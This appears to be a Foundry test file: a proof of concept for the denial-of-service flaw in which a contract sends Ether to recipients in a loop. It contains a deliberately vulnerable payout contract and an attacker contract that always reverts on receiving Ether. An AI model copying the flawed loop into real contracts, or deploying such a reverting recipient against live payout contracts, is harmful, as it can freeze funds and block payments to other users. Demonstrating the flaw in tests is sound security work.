pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Include the vulnerable contracts as defined

// MaliciousRecipient: any Ether sent (via fallback or receive) reverts
contract MaliciousRecipient {
    // When Ether is received, revert
    fallback() external payable {
        revert("Attack: Failing fallback");
    }
    
    receive() external payable {
        revert("Attack: Failing receive");
    }
}

contract VulnerableCallsInLoop {
    address[] public destinations;
    
    constructor(address[] memory newDestinations) {
        destinations = newDestinations;
    }
    
    // distribute function attempts to send 1 wei to each address in destinations via transfer
    // if one of the transfers reverts, the whole tx is reverted
    function distribute() external payable {
        require(msg.value >= destinations.length, "Insufficient Ether provided");
        for (uint i = 0; i < destinations.length; i++) {
            payable(destinations[i]).transfer(1 wei);
        }
    }
    
    receive() external payable {}
}

// Forge test to demonstrate the vulnerability from improper exception handling in a loop
// When a malicious recipient is in the destinations array, the distribute() call will revert

contract VulnerableCallsInLoopTest is Test {
    VulnerableCallsInLoop public vulnerable;
    MaliciousRecipient public malicious;
    address public normalRecipient;

    function setUp() public {
        // Deploy a malicious recipient contract
        malicious = new MaliciousRecipient();
        
        // For a normal recipient, we can simply use an EOA address (EOAs do not have fallback functions that revert)
        normalRecipient = address(0xBEEF);

        // Build destination array: one normal and one malicious
        address[] memory destinations = new address[](2);
        destinations[0] = normalRecipient; 
        destinations[1] = address(malicious);

        // Deploy the VulnerableCallsInLoop contract with the crafted list of destinations
        vulnerable = new VulnerableCallsInLoop(destinations);
    }

    // Test that the distribution transaction reverts when a recipient reverts on receiving Ether
    function testDistributeRevertsDueToMaliciousRecipient() public {
        // We need to supply at least 2 wei (1 wei for each destination)
        uint256 amountToSend = 2 wei;

        // Expect the transaction to revert due to the malicious recipient's fallback reverting
        vm.expectRevert();
        vulnerable.distribute{value: amountToSend}();
    }

    // Optionally, test a normal distribution scenario when no malicious recipient is included
    function testDistributeSucceedsWithAllNormalRecipients() public {
        // Create a new list with only normal recipients
        address[] memory safeDestinations = new address[](2);
        safeDestinations[0] = normalRecipient;
        safeDestinations[1] = address(0xCAFE);

        VulnerableCallsInLoop safeContract = new VulnerableCallsInLoop(safeDestinations);
        
        // Provide 2 wei to cover the two transfers
        uint256 amountToSend = 2 wei;
        
        // This transaction should succeed as both recipients are EOAs and will accept Ether transfer
        safeContract.distribute{value: amountToSend}();

        // Check the balances: normalRecipient and 0xCAFE should have received 1 wei each
        // Note: Since we used transfer, the funds are forwarded and then the balance of safeContract is depleted
        // We can check that the contract's balance is 0
        assertEq(address(safeContract).balance, 0, "Contract should have 0 balance after distribution");
    }

    // Test that a transaction with insufficient Ether fails with the proper error
    function testDistributeInsufficientEther() public {
        // Provide less Ether than required (only 1 wei but 2 recipients)
        uint256 insufficientAmount = 1 wei;
        
        vm.expectRevert("Insufficient Ether provided");
        vulnerable.distribute{value: insufficientAmount}();
    }
}
